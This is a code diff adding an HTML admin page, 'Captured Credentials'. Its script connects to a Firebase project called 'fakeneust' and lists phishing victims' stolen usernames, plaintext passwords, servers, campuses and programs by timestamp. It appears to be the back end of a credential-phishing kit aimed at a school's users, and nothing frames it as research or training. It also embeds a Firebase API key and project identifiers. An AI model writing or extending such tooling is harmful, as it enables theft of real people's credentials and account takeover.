@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title>Admin - Captured Credentials</title>
+    <style>
+        body {
+            font-family: sans-serif;
+            padding: 20px;
+            background: #fdfdfd;
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 20px;
+        }
+
+        th,
+        td {
+            border: 1px solid #ddd;
+            padding: 8px;
+            text-align: left;
+        }
+
+        th {
+            background: #f2f2f2;
+        }
+    </style>
+</head>
+
+<body>
+    <h1>Captured Credentials</h1>
+    <table id="credsTable">
+        <thead>
+            <tr>
+                <th>Username</th>
+                <th>Password</th>
+                <th>Server</th>
+                <th>Campus</th>
+                <th>Program</th>
+                <th>Timestamp</th>
+            </tr>
+        </thead>
+        <tbody>
+            <tr>
+                <td colspan="4">Loading...</td>
+            </tr>
+        </tbody>
+    </table>
+
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
+        import { getFirestore, collection, getDocs, orderBy, query } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyCxS5bpVtVzjxovMGpY0MP8rlr5m-m6Ay0",
+            authDomain: "fakeneust.firebaseapp.com",
+            projectId: "fakeneust",
+            storageBucket: "fakeneust.firebasestorage.app",
+            messagingSenderId: "226469392303",
+            appId: "1:226469392303:web:2a81f09f14a865f095095a"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const db = getFirestore(app);
+
+        async function loadCreds() {
+            const tbody = document.querySelector('#credsTable tbody');
+            try {
+                // If the user's Firestore lacks indexes for orderBy, this might fail, but let's try
+                // Actually to avoid missing index errors on fresh Firebase, just getDocs:
+                const snapshot = await getDocs(collection(db, "credentials"));
+                tbody.innerHTML = '';
+
+                if (snapshot.empty) {
+                    tbody.innerHTML = '<tr><td colspan="4">No credentials captured yet.</td></tr>';
+                    return;
+                }
+
+                // Sort manually to avoid Firestore index requirement
+                const docs = [];
+                snapshot.forEach(doc => docs.push({ id: doc.id, ...doc.data() }));
+                docs.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
+
+                docs.forEach(data => {
+                    const tr = document.createElement('tr');
+                    tr.innerHTML = `
+                        <td>${document.createTextNode(data.username).textContent || ''}</td>
+                        <td>${document.createTextNode(data.password).textContent || ''}</td>
+                        <td>${document.createTextNode(data.server || '').textContent || ''}</td>
+                        <td>${document.createTextNode(data.campus || '').textContent || ''}</td>
+                        <td>${document.createTextNode(data.program || data.course || '').textContent || ''}</td>
+                        <td>${new Date(data.timestamp).toLocaleString()}</td>
+                    `;
+                    tbody.appendChild(tr);
+                });
+            } catch (e) {
+                console.error(e);
+                tbody.innerHTML = '<tr><td colspan="4" style="color:red">Error loading credentials. Make sure Firestore rules allow read access.</td></tr>';
+            }
+        }
+
+        loadCreds();
+    </script>
+</body>
+
+</html>
